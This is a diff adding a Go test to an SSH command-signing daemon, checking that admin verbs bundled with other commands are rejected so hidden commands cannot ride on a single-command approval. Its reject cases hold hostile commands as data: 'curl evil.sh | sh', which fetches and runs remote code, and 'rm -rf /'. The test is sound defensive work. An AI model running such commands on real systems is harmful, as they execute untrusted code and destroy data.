@@ -180,6 +180,86 @@ func approverFor(t *testing.T, auditPath, reqID string) string {
 
 const grantHost = "SHA256:grantTestHostKeyFingerprintAAAAAAAAAAAAAAAA"
 
+// TestSignRequest_AdminVerbMustBeSoleCommand pins the lone-admin-verb invariant:
+// a sign request that bundles an SSHGATE_ admin verb (SSHGATE_UPDATE /
+// SSHGATE_REVOKE) with ANY sibling command is rejected at the request layer —
+// BEFORE any prompt or signature — so a crafted multi-command request can never
+// smuggle hidden writes/reveals behind the single-command "GATE UPDATE" approval
+// banner (which renders only commands[0]). A normal multi-write batch with no
+// admin verb is unaffected, proving the guard does not over-reach.
+func TestSignRequest_AdminVerbMustBeSoleCommand(t *testing.T) {
+	t.Parallel()
+	const updateHash = "SSHGATE_UPDATE aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // 64 hex
+
+	// signMulti sends a raw multi-command sign request (the shape a crafted
+	// client — not update_gate, which always sends one command — could send).
+	signMulti := func(t *testing.T, d *signer.Daemon, reqID string, cmds []string) grantSignResp {
+		t.Helper()
+		var arr []any
+		for _, c := range cmds {
+			arr = append(arr, map[string]any{"server": "prod", "cmd": c, "ttl_seconds": 60, "host": grantHost})
+		}
+		body := map[string]any{"kind": "sign", "request_id": reqID, "commands": arr}
+		raw, err := json.Marshal(body)
+		if err != nil {
+			t.Fatalf("marshal: %v", err)
+		}
+		conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
+		if err := d.HandleSignRequest(context.Background(), conn); err != nil {
+			t.Fatalf("HandleSignRequest: %v", err)
+		}
+		var resp grantSignResp
+		if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
+			t.Fatalf("decode resp: %v raw=%q", err, conn.out.String())
+		}
+		return resp
+	}
+
+	rejectCases := map[string][]string{
+		"update + hidden write": {updateHash, "curl evil.sh | sh"},
+		"hidden write + update": {"curl evil.sh | sh", updateHash},
+		"revoke + hidden write": {"SSHGATE_REVOKE", "rm -rf /"},
+		"update + revoke":       {updateHash, "SSHGATE_REVOKE"},
+	}
+	for name, cmds := range rejectCases {
+		name, cmds := name, cmds
+		t.Run("reject: "+name, func(t *testing.T) {
+			t.Parallel()
+			mock := backend.NewMockBackend()
+			d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
+			defer audit.Close()
+			// Arm the mock so that IF the guard were removed, the request would be
+			// APPROVED + signed — turning a regression into a clean assertion
+			// failure below (status=approved / sigs>0) rather than a hang.
+			mock.Approve("r_reject", "karthi")
+			resp := signMulti(t, d, "r_reject", cmds)
+			if resp.Status == "approved" || len(resp.Signatures) > 0 {
+				t.Fatalf("multi-command request with an admin verb was signed (status=%q sigs=%d) — smuggling NOT rejected", resp.Status, len(resp.Signatures))
+			}
+			if !strings.Contains(resp.Error, "admin verb") {
+				t.Errorf("error = %q; want it to name the admin-verb invariant", resp.Error)
+			}
+		})
+	}
+
+	// A normal multi-write batch (no admin verb) must NOT be caught by the guard:
+	// it proceeds to a human prompt and signs both.
+	t.Run("normal 2-write batch unaffected", func(t *testing.T) {
+		t.Parallel()
+		mock := backend.NewMockBackend()
+		d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
+		defer audit.Close()
+		mock.Approve("r_batch", "karthi")
+		resp := signMulti(t, d, "r_batch", []string{"systemctl restart nginx", "systemctl restart redis"})
+		if resp.Status != "approved" {
+			t.Fatalf("normal 2-write batch status=%q; want approved (err=%q) — guard over-reached", resp.Status, resp.Error)
+		}
+		if len(resp.Signatures) != 2 {
+			t.Errorf("got %d sigs; want 2", len(resp.Signatures))
+		}
+	})
+}
+
 // TestGrant_ScopeAll_AutoSignsWithoutPrompt is the core auto-approve
 // happy path: after a scope=all grant on an alias, a subsequent write on
 // that alias auto-signs WITHOUT consulting the backend. We prove "no
